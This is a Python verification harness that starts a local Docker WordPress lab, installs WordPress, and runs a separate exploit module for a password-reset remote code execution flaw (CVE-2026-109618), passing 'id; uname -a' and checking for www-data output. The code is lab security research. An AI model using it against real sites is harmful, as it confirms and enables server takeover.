#!/usr/bin/env python3 -I
"""Green/red harness for resetpass_rce.py: optionally brings up the WordPress
mod_php stack, installs WordPress, drives the full wp-resetpass CVE-2026-109618
RCE and asserts it returns uid=33 in-band (exit 0 = confirmed, exit 1 = blocker).

Bring up the lab:
    python3 -I poc/routes/wordpress/verify_resetpass_rce.py --up --install
    python3 -I poc/routes/wordpress/verify_resetpass_rce.py   # stack already up
"""

import argparse
import os
import subprocess
import sys
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(os.path.dirname(os.path.dirname(HERE)))
COMPOSE = os.path.join(REPO, "docker-compose.apps.yml")
MODULE = os.path.join(HERE, "resetpass_rce.py")
URL = "http://127.0.0.1:19500/wordpress"
ADMIN_PW = "P2s-Admin!2026"
DB_ROOT_PW = "R00t-P2s!Lab"


def sh(cmd, timeout=120, check=False):
    r = subprocess.run(cmd, capture_output=True, timeout=timeout)
    if check and r.returncode != 0:
        print("[-] cmd failed: %s\n%s" % (" ".join(cmd), r.stderr.decode("latin1", "replace")))
        sys.exit(1)
    return r


def compose_up():
    print("[*] docker compose up -d (project p2s-wp854)")
    sh(["docker", "compose", "-f", COMPOSE, "-p", "p2s-wp854", "--profile", "wp854", "up", "-d"], timeout=300, check=True)


def wp_installed():
    r = sh(["docker", "exec", "-e", "MYSQL_PWD=" + DB_ROOT_PW, "wpdb00001",
            "mariadb", "-uroot", "-N", "-B", "-e",
            "SELECT COUNT(*) FROM information_schema.tables WHERE "
            "table_schema='wordpress' AND table_name='wp_options';"])
    return r.stdout.strip() == b"1"


def wp_install():
    if wp_installed():
        print("[*] WordPress already installed")
        return
    print("[*] installing WordPress 7.1.3")
    data = [("weblog_title", "PHP2Shell"), ("user_name", "admin"),
            ("admin_password", ADMIN_PW), ("admin_password2", ADMIN_PW),
            ("admin_email", "admin@example.com"), ("blog_public", "0"),
            ("Submit", "Install WordPress"), ("language", "")]
    sh(["curl", "-fsS", "-L", "-o", "/dev/null"]
       + sum((["--data-urlencode", "%s=%s" % kv] for kv in data), [])
       + [URL + "/wp-admin/install.php?step=2"], timeout=120)
    if not wp_installed():
        print("[-] WordPress install failed")
        sys.exit(1)
    print("[+] WordPress installed")


def reachable():
    try:
        with urllib.request.urlopen(URL + "/wp-login.php", timeout=10) as r:
            return r.status == 200
    except Exception:
        return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--up", action="store_true", help="docker compose up the lab first")
    ap.add_argument("--install", action="store_true", help="run the WP install step")
    ap.add_argument("--rounds", type=int, default=2)
    ap.add_argument("--leak-tries", dest="leak_tries", type=int, default=4)
    args = ap.parse_args()

    if args.up:
        compose_up()
    if not reachable() and not args.up:
        print("[-] %s unreachable - run with --up (and --install the first time)" % URL)
        return 1
    # wait for web if we just brought it up
    if args.up:
        import time
        for _ in range(60):
            if reachable():
                break
            time.sleep(1)
    if args.install:
        wp_install()
    elif not wp_installed():
        print("[-] WordPress not installed - re-run with --install")
        return 1

    print("[*] driving wp_resetpass_rce_854.py against %s" % URL)
    r = subprocess.run(
        [sys.executable, "-I", MODULE, "--url", URL,
         "--rounds", str(args.rounds), "--leak-tries", str(args.leak_tries),
         "--cmd", "id; uname -a"],
        capture_output=True, timeout=1800)
    out = r.stdout.decode("latin1", "replace")
    err = r.stderr.decode("latin1", "replace")
    print(out)
    if err.strip():
        print("--- stderr ---\n" + err)

    rce = "RCE CONFIRMED" in out
    uid33 = "uid=33(www-data)" in out
    leak783 = "in-band chunkbase" in out
    print("=" * 64)
    print("[=] leak=%s rce=%s uid33=%s" % (leak783, rce, uid33))
    if rce and uid33:
        print("[GREEN] wp-resetpass CVE-2026-109618 RCE CONFIRMED-ours on 8.5.4/WP7.1.3")
        return 0
    print("[RED] RCE not confirmed (see output above)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
